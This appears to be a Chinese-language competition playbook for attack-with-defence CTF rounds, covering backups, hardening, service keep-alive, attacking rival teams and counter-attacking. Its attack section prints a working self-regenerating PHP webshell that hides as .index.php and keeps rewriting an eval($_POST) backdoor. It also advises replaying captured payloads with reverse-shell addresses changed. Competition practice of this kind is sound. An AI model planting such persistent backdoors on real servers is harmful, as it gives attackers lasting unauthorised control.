# 权限维持与 AWD（赛制含攻防对抗时开）

> 决赛若含 AWD 要素（己方靶机被其它队打、服务要保活），本篇是守 + 反打的完整动作。纯夺旗制可跳过。

## AWD 开场三件事（前 10 分钟）

1. **备份**：全量源码 + 数据库打包拖回本地（被打穿后靠备份复活判题）
   ```bash
   tar czf /tmp/src_$(date +%H%M).tgz /var/www/html
   mysqldump -uroot -p'xx' --all-databases > /tmp/db.sql
   # 打包 web + crontab -l + /etc/passwd 快照
   ```
2. **改口令**：ssh / mysql / 后台口令全换长随机（别人也拿着默认口令），改完记台账
3. **挂 WAF/流量监控**：脚本级 WAF（php 白名单执行、请求日志）或开源 aoawd/aws-waf 类；**流量日志是反打弹药**

## 防御加固（按得分权重做）

- 找到己方应用的洞（备份源码本地审计）→ **patch 最小化**：只堵利用点（加过滤/删危险函数），别重构——判题机要能正常访问
- 删比赛无关的危险文件：遗留 webshell、`phpinfo.php`、测试页、`/install/`
- 关闭危险函数（php `disable_functions` 里 system/exec/shell_exec——注意别把判题需要的函数禁了）
- `find /var/www -name "*.php" -mmin -30` 监控新增文件（别人写的马立刻删）
- crontab 里非比赛的定时任务（别人留的后门）清掉，但**先抄下 payload 再删**（反打素材）
- ssh 层：`/root/.ssh/authorized_keys` 清陌生 key；`/etc/passwd` 查陌生 uid=0 用户

## 服务保活（AWD 扣分最大头）

**AWD 失分第一名不是被打穿，是服务 down。**判题机（checker）周期性访问你的服务，不通就扣分，且被 down 后重开赛内很难补回。

三件事按顺序做：

1. **准入验证**：拿一台干净机器（或本地）按 checker 的访问路径手动过一遍——**判题要的功能必须还能用**。所有加固动作做完都要重跑这一遍。
2. **崩溃自拉**：给关键服务加守护。
   ```bash
   # 最简：crontab 每分钟探测，失败则拉起
   * * * * * curl -s -m 3 http://127.0.0.1:80/ >/dev/null || systemctl restart nginx
   # php-fpm / supervisor 类：确认进程数配置合理，崩溃要自动重启
   # nginx + php-fpm：注意 request_terminate_timeout，别人用长连接打满 worker 会让你整站 502
   ```
3. **容量防护**：别人会用慢连接 / 大包 / 死循环请求打瘫你的服务。限流、限并发、调 `worker_connections`、必要时上脚本级 WAF。

**恢复演练（大概率被考到）**

- 备份之后**一定要练一次恢复**：`tar xzf` 回原目录 + 数据库 `mysql < db.sql` + 确认服务起来 + 判题通过。只备份不演练等于没备份。
- 恢复用**你记下的原口令**（不是改后的）——改口令后要在台账里写清，否则恢复时自己进不去。
- 被 down 后优先恢复服务可用性（先拉起旧版让判题过），再回头查杀。

## 进攻（打别人靶机）

- 打下别队靶机：拿 flag → **留不死马** → 顺手 patch 它的洞（别人也来打就打不进，flag 归你反复拿）
- 不死马套路（GNU/Linux）：
  ```php
  <?php // .index.php 隐藏马：ignore_user_abort + sleep 循环重生
  ignore_user_abort(true); set_time_limit(0);
  $f='/var/www/html/.shell.php';
  while(1){ @file_put_contents($f,'<?php eval($_POST[1]);'); sleep(30); }
  // 起一次后即使被删也会重生；删它的方法是 kill 进程/重启 php-fpm
  ```
- 软链接马 / `.htaccess` 后门 / `php://input` 一句话变体——被杀软/WAF 盯上就换姿势
- flag 轮换型（每几分钟变）：**人工**（或人工安排的独立进程）写轮询脚本；
  **agent 不参与提交** —— 见 SKILL.md「平台接口纪律」。

## 反打（最高效得分）

- 流量日志里翻别人打你的 payload：他怎么打的你，原样回敬全场（改下 IP）
- 抓到别队 webshell 路径 → 监控该路径：他连上来时记录口令/后门特征，遍历别队机器试同路径（AWD 全场同镜像，**洞全场通用**）
- 你 patch 的洞、别人没 patch → 你的 payload 全场挨个交一遍

## 节奏纪律

1. 攻防交替：拿一波分 → 回头守 5 分钟（日志/新增文件）→ 再攻。只攻不守必被翻盘
2. patch 前先本地验证判题功能不坏
3. 台账三列：已 patch 的洞 / 留下的马 / 已知别人的后门
4. 比赛最后 30 分钟全面查杀一次自己机器（别人会在终场前埋马）

## 假点

- patch 把功能改坏判题失败 = 负分，改动最小化
- 删了别人的马没 kill 进程 → 马重生（GNU 循环马），删文件 + `ps -ef | grep php` 杀进程一起做
- 只改了 web 口令没改 ssh/mysql → 别人从数据库层回来
- 流量抓到 payload 直接抄 → 注意里面的反弹地址是他队的，改成你的再打
